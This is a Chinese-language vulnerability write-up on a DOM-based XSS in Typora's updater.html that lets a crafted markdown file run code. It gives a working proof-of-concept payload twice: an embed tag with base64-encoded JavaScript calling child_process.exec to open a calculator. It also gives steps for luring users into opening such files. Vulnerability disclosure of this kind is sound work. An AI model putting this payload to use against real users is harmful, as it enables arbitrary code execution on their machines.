## 漏洞详情

版本16.7以前的Typora中的updater/update.html存在基于DOM的XSS，可以通过加载定制的markdown文件实现任意javascript代码执行。

![1693884658_64f6a0f267d5ff842e895.png!small](https://image.3001.net/images/20230905/1693884658_64f6a0f267d5ff842e895.png!small)

## 原理分析

漏洞触发点位于Typora的updater.html文件，通过特定协议typora://即可访问，同时该文件可以通过URL进行参数传递。update.html在Windows上的参考路径如下：

    
    
    file:///C:/Program%20Files/Typora/resources/updater/updater.html

查看update.html源码。

![1693884668_64f6a0fc7ff5508f461b0.png!small](https://image.3001.net/images/20230905/1693884668_64f6a0fc7ff5508f461b0.png!small)

HTML文件中的JavaScript代码会从当前URL的查询字符串中通过`window.location.search`提取名字为"labels"的参数值，解码后用JSON解析。然后使用`document.querySelector("#sum").innerText`来修改id为"sum"的HTML元素内的文字内容，将labels[4]和labels[5]中的特定部分插入其中。

同时使用`document.querySelectorAll("[data-label]")`找到所有"data-label"属性的HTML元素，将它们的属性值作为labels数组的key进行查询，并将查询到的value替换到innerHTML中的对应元素上。

![1693884684_64f6a10c792938288ef61.png!small](https://image.3001.net/images/20230905/1693884684_64f6a10c792938288ef61.png!small)

此时我们注意到几个关键点：

  1. labels数组输入可控；

  2. labels数据的数据没有检查和过滤；

  3. labels数组中部分元素会被放到innerHTML的对应元素中去；（见图1）

  4. 只有与"data-label"有关的元素会被放到labels数据组，即只有前4个元素可行（见图2）

简言之，如果存在一个满足上述条件的恶意JS代码被包含在labels数组中，我们就可以实现恶意JS的远程执行。现在我们就可以构造payload了。

恶意payload如下：

    
    
    <embed style="height:0;" src="typora://app/typemark/updater/updater.html?curVersion=111&newVersion=222&releaseNoteLink=333&hideAutoUpdates=false&labels=[%22%22,%22%3csvg%2fonload=top.eval(atob('cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ=='))><%2fsvg>%22,%22%22,%22%22,%22%22,%22%22]">

小tricks：

  * 此处使用`reqnode('child_process').exec()`创建子进程执行指定命令，其中reqnode是typora自行封装的require函数；

> <https://github.com/typora/typora-issues/issues/2226>

在实战利用中，攻击者可以诱导用户打开恶意markdown文件或者从网站复制恶意文本到typora，通过标签<embed>引用update.html，实现远程的恶意JS加载。

# 漏洞复现

新建一个任意的文本文件，名为poc.txt，输入恶意payload。

    
    
    <embed style="height:0;" src="typora://app/typemark/updater/updater.html?curVersion=111&newVersion=222&releaseNoteLink=333&hideAutoUpdates=false&labels=[%22%22,%22%3csvg%2fonload=top.eval(atob('cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ=='))><%2fsvg>%22,%22%22,%22%22,%22%22,%22%22]">

![1693884731_64f6a13bcdb3fa6ec8bb7.png!small](https://image.3001.net/images/20230905/1693884731_64f6a13bcdb3fa6ec8bb7.png!small)

现在将poc.txt文件重命名为poc.md，并使用typora打开。

![1693884618_64f6a0ca0fe2c0834ad60.png!small](https://image.3001.net/images/20230905/1693884618_64f6a0ca0fe2c0834ad60.png!small)

演示版本为：

![1693884754_64f6a1522150c3201c1d5.png!small](https://image.3001.net/images/20230905/1693884754_64f6a1522150c3201c1d5.png!small)

  

